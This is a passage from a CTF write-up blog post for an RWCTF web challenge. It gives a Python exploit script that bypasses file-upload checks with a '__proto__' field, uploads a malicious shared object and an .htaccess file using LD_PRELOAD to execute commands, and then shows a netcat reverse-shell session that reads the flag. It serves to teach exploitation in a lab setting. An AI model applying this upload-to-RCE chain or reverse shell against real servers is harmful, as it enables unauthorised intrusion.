+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>target_ip</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>target_upload_port</span> <span class=o>=</span> <span class=mi>31337</span>
+</span></span><span class=line><span class=cl><span class=n>upload_file</span> <span class=o>=</span> <span class=s2>&#34;.htaccess&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>target_render_port</span> <span class=o>=</span> <span class=mi>31338</span>
+</span></span><span class=line><span class=cl><span class=n>request_sender_ip</span> <span class=o>=</span> <span class=s2>&#34;172.18.0.1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>request_ip</span> <span class=o>=</span> <span class=s2>&#34;::ffff:</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>request_sender_ip</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 还是 为了好看</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_request</span><span class=p>(</span><span class=n>response</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;request form&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>method</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>header_key</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>header_key</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=n>header_key</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>body</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>body</span> <span class=o>==</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span> <span class=n>body</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_response</span><span class=p>(</span><span class=n>response</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;response form&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>header_key</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>header_key</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=n>header_key</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>string</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 计算上传路径</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>calc_upload_path</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span> <span class=n>form_id</span> <span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
+</span></span></span><span class=line><span class=cl><span class=s2>    userfile = sampleFile.name.toString();
+</span></span></span><span class=line><span class=cl><span class=s2>    if(userfile.includes(&#39;/&#39;)||userfile.includes(&#39;..&#39;)){
+</span></span></span><span class=line><span class=cl><span class=s2>      return res.status(500).send(&#34;Invalid file name&#34;);
+</span></span></span><span class=line><span class=cl><span class=s2>    }
+</span></span></span><span class=line><span class=cl><span class=s2>    uploadPath = &#39;/uploads/&#39; + userdir + &#39;/&#39; + userfile;
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>file_md5</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>userdir</span>  <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>md5</span><span class=p>(</span><span class=n>request_ip</span><span class=p>)</span><span class=o>+</span><span class=n>file_md5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>userfile</span> <span class=o>=</span> <span class=n>form_id</span>
+</span></span><span class=line><span class=cl>    <span class=c1># upload_path = &#39;/uploads/&#39; + userdir + &#39;/&#39; + userfile # the realworld ctf Env</span>
+</span></span><span class=line><span class=cl>    <span class=n>upload_path</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>+</span> <span class=n>userdir</span> <span class=o>+</span> <span class=s1>&#39;/&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>upload_path</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=c1>## STEP 4 upload error</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 上传 1.so</span>
+</span></span><span class=line><span class=cl>    <span class=n>sofile_path</span> <span class=o>=</span> <span class=n>uplaod_file</span><span class=p>(</span><span class=s2>&#34;1.so&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;SetEnv LD_PRELOAD &#34;/var/www/html</span><span class=si>{}</span><span class=s2>1.so&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>SetOutputFilter gzip
+</span></span></span><span class=line><span class=cl><span class=s2>ErrorDocument 403 /etc/apache2/apache2.conf
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sofile_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 启用 gzip 过滤器 执行命令</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 生成 htaccess</span>
+</span></span><span class=line><span class=cl>    <span class=n>htaccess_file_gen</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 输出 这里为了 debug</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;sofile_path: &#34;</span><span class=p>,</span><span class=n>sofile_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 上传 htaccess</span>
+</span></span><span class=line><span class=cl>    <span class=n>htaccess_path</span> <span class=o>=</span> <span class=n>uplaod_file</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;htaccess_path: &#34;</span><span class=p>,</span><span class=n>htaccess_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;getshell exec with curl http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span><span class=n>target_render_port</span><span class=p>)</span><span class=o>+</span><span class=n>htaccess_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 生成代码</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>htaccess_file_gen</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;gen successfully&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=c1># 上传文件 利用方法是上面 提到的</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>uplaod_file</span><span class=p>(</span><span class=n>filename</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>uplaod_url1</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>/&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span> <span class=n>target_upload_port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>uplaod_url1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>form_id</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;action=&#39;&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>real_form_id</span> <span class=o>=</span> <span class=n>form_id</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;/upload?formid=&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;you should use this id: &#34;</span><span class=p>,</span><span class=n>real_form_id</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>upload_url2</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>/upload?formid=</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span><span class=n>target_upload_port</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;__proto__&#34;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;decoy&#34;</span><span class=p>:(</span><span class=s2>&#34;decoy&#34;</span><span class=p>,</span><span class=s2>&#34;random&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>upload_url2</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_request</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_response</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>form_id</span> <span class=o>=</span> <span class=n>real_form_id</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>calc_upload_path</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=n>form_id</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>最后运行结果的 拿到 .htaccess 文件对应的地址 一个 curl 打过去就有了</p><p>当然记得起 netcat 的监听</p><h2 id=最后-getshell-readflag>最后 Getshell readflag</h2><p>直接执行一个 readflag 的计算</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ nc -lvvp <span class=m>8884</span>        
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>8884</span> ...
+</span></span><span class=line><span class=cl>172.18.0.3: inverse host lookup failed: Unknown host
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>172.18.0.1<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>172.18.0.3<span class=o>]</span> <span class=m>54924</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>31<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@a17ac98d17ba:/$ ls -al
+</span></span><span class=line><span class=cl>ls -al
+</span></span><span class=line><span class=cl>total <span class=m>100</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 .
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 ..
+</span></span><span class=line><span class=cl>-rwxr-xr-x   <span class=m>1</span> root root     <span class=m>0</span> Jan <span class=m>27</span> 07:28 .dockerenv
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:29 bin
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Apr <span class=m>24</span>  <span class=m>2018</span> boot
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>5</span> root root   <span class=m>340</span> Jan <span class=m>27</span> 07:28 dev
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 etc
+</span></span><span class=line><span class=cl>-r-x------   <span class=m>1</span> root root    <span class=m>39</span> Jan <span class=m>20</span> 09:19 flag
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Apr <span class=m>24</span>  <span class=m>2018</span> home
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> May <span class=m>23</span>  <span class=m>2017</span> lib
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:29 lib64
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:27 media
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:27 mnt
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:27 opt
+</span></span><span class=line><span class=cl>dr-xr-xr-x <span class=m>334</span> root root     <span class=m>0</span> Jan <span class=m>27</span> 07:28 proc
+</span></span><span class=line><span class=cl>-r-sr-xr-x   <span class=m>1</span> root root <span class=m>13144</span> Jan <span class=m>20</span> 09:16 readflag
+</span></span><span class=line><span class=cl>drwx------   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:44 root
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 run
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:29 sbin
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:27 srv
+</span></span><span class=line><span class=cl>dr-xr-xr-x  <span class=m>13</span> root root     <span class=m>0</span> Jan <span class=m>27</span> 07:28 sys
+</span></span><span class=line><span class=cl>drwxrwxrwt   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 tmp
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan  <span class=m>5</span> 19:27 usr
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root  <span class=m>4096</span> Jan <span class=m>27</span> 07:28 var
+</span></span><span class=line><span class=cl>www-data@a17ac98d17ba:/$ readflag
+</span></span><span class=line><span class=cl>readflag
+</span></span><span class=line><span class=cl>bash: readflag: <span class=nb>command</span> not found
+</span></span><span class=line><span class=cl>www-data@a17ac98d17ba:/$ ./readflag
+</span></span><span class=line><span class=cl>./readflag
+</span></span><span class=line><span class=cl>Solve the easy challenge first
+</span></span><span class=line><span class=cl><span class=o>(((((</span>-854089<span class=o>)</span>-<span class=o>(</span>772258<span class=o>))</span>+<span class=o>(</span>5324<span class=o>))</span>+<span class=o>(</span>474988<span class=o>))</span>-<span class=o>(</span>-472881<span class=o>))</span>
+</span></span><span class=line><span class=cl>input your answer: -673154
+</span></span><span class=line><span class=cl>ok! here is your flag!!
+</span></span><span class=line><span class=cl>rwctf<span class=o>{</span>cd81450983c06bcb4438dfb8de45ec04<span class=o>}</span>www-data@a17ac98d17ba:/$ 
+</span></span></code></pre></td></tr></table></div></div><h2 id=wrap-up>Wrap up</h2><p>总体思路与知识点</p><ol><li>代码审计</li><li>proto 利用 | 发现双文件上传 bypass</li><li>利用 htaccess 越界读 获取 一些敏感配置文件</li><li>利用 htaccess 和 一些错误配置 RCE</li></ol><div class=blog-tags><a href=https://su-team.cn/tags/rwctf/>RWCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/rwctf-2023-su-wu/>2023 RWCTF体验赛 SU Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/sctf-2021-su-wu/ data-toggle=tooltip data-placement=top title="2021 SCTF SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/susctf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 SUSCTF SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
+&nbsp;&bull;&nbsp;&copy;
+2026
+&nbsp;&bull;&nbsp;
+<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
